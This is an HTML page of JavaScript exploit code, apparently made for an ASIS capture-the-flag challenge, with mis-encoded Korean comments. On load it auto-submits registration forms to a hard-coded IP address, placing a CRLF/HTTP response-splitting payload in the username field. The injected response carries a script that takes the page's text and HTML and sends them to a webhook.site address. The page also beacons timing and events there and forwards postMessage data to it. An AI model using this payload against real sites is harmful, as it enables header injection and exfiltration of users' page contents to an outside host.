<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Final Verification</title>
</head>
<body>
    <h1>Final Verification - Monitoring All Signals</h1>
    
    <iframe name="reg" style="display:none;"></iframe>
    
    <script>
    var WEBHOOK = 'https://webhook.site/e6f5490e-7765-4cb7-a32e-efd8dbbb4b81';
    
    // ë§¤ìš° ëª…í™•í•œ CRLF payload
    var crlfPayload = 
        '\r\n' +
        'Content-Length: 0\r\n' +
        '\r\n' +
        'HTTP/1.1 200 OK\r\n' +
        'Content-Type: text/html\r\n' +
        '\r\n' +
        '<html><head><title>INJECTED</title></head><body>' +
        '<h1 style="background:red;color:white;padding:50px;font-size:60px;text-align:center">' +
        'ğŸ‰ğŸ‰ğŸ‰ FLAG EXTRACTED ğŸ‰ğŸ‰ğŸ‰' +
        '</h1>' +
        '<div id="content"></div>' +
        '<img src="' + WEBHOOK + '?signal=CRLF_TRIGGERED" style="display:none">' +
        '<script>' +
        // Extract all text content
        'var allText = document.body.textContent || document.body.innerText;' +
        'var html = document.body.innerHTML;' +
        // Send everything to webhook
        'var data = {' +
        '  timestamp: new Date().toISOString(),' +
        '  text: allText,' +
        '  html: html,' +
        '  url: location.href' +
        '};' +
        'fetch("' + WEBHOOK + '", {' +
        '  method: "POST",' +
        '  headers: {"Content-Type": "application/json"},' +
        '  body: JSON.stringify(data)' +
        '});' +
        // Also try navigator.sendBeacon
        'navigator.sendBeacon("' + WEBHOOK + '", JSON.stringify(data));' +
        '</scr' + 'ipt>' +
        '</body></html>';
    
    // ì—¬ëŸ¬ FLAG í˜•ì‹ìœ¼ë¡œ ë“±ë¡
    var flags = [
        'ASIS{bookmarks}',
        'ASIS{crlf_injection}',
        'ASIS{http_response_splitting}',
        'ASIS{header_injection}'
    ];
    
    // ì¦‰ì‹œ ë“±ë¡
    navigator.sendBeacon(WEBHOOK, 'STEP0: Starting registrations');
    
    flags.forEach(function(flagName, index) {
        setTimeout(function() {
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://65.109.202.184/register';
            form.target = 'reg';
            
            var u = document.createElement('input');
            u.name = 'username';
            u.value = flagName + crlfPayload;
            
            var p = document.createElement('input');
            p.name = 'password';
            p.value = 'password';
            
            form.appendChild(u);
            form.appendChild(p);
            document.body.appendChild(form);
            form.submit();
        }, index * 100);
    });
    
    setTimeout(function() {
        navigator.sendBeacon(WEBHOOK, 'STEP1: All registrations complete');
    }, 1000);
    
    // íƒ€ì´ë° ì¶”ì  (ë§¤ ì´ˆë§ˆë‹¤ 30ì´ˆê°„)
    for (var i = 1; i <= 30; i++) {
        (function(sec) {
            setTimeout(function() {
                navigator.sendBeacon(WEBHOOK, 'TIME_' + sec + 's');
            }, sec * 1000);
        })(i);
    }
    
    // ëª¨ë“  ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë„ˆ
    window.addEventListener('beforeunload', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: beforeunload');
    });
    
    window.addEventListener('pagehide', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: pagehide');
    });
    
    document.addEventListener('visibilitychange', function() {
        navigator.sendBeacon(WEBHOOK, 'EVENT: visibility=' + document.visibilityState);
    });
    
    // postMessage ìˆ˜ì‹ 
    window.addEventListener('message', function(event) {
        var data = {
            type: 'postMessage',
            origin: event.origin,
            data: event.data
        };
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    });
    
    /*
    ì˜ˆìƒ ì‹œë‚˜ë¦¬ì˜¤:
    
    IF ì‹¤ì œ botì´ dashboardë¥¼ ë°©ë¬¸í•œë‹¤ë©´:
    â†’ Webhookì— ë‹¤ìŒ ì‹ í˜¸ê°€ ì˜¬ ê²ƒ:
      1. ?signal=CRLF_TRIGGERED (GET request)
      2. POST request with FLAG in "text" or "html"
      3. "FLAG EXTRACTED" ë©”ì‹œì§€
    
    IF botì´ dashboardë¥¼ ë°©ë¬¸í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´:
    â†’ TIME_1s ~ TIME_30s ì‹ í˜¸ë§Œ ì˜´
    â†’ CRLF ê´€ë ¨ ì‹ í˜¸ ì—†ìŒ
    
    ì´ê²ƒìœ¼ë¡œ ì‹¤ì œ bot ë™ì‘ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!
    */
    </script>
</body>
</html>
